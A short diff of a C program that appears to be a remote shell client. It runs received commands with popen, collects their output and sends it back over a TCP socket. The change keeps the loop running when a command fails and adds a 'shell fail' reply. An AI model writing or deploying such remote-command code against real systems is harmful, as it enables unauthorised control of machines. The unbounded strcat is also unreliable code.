@@ -71,14 +71,21 @@ int main()
 			
 			if((fp = popen(buf, "r")) == NULL)
 			{
-				printf("CommandError\n");
-				close(ClientSocket);
-				return 0;
+				//printf("CommandError\n");
+				//close(ClientSocket);
+				//return 0;
+				continue;
 			}
 			while(fgets(tb, sizeof(tb), fp))
 			{
 				strcat(sendbuf, tb);
 			}
+			pclose(fp);
+		}
+
+		if(!memcmp(sendbuf, "\0", 1))
+		{
+			memcpy(sendbuf, "shell fail\n", 12);
 		}
 
 		while((ClientSocket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
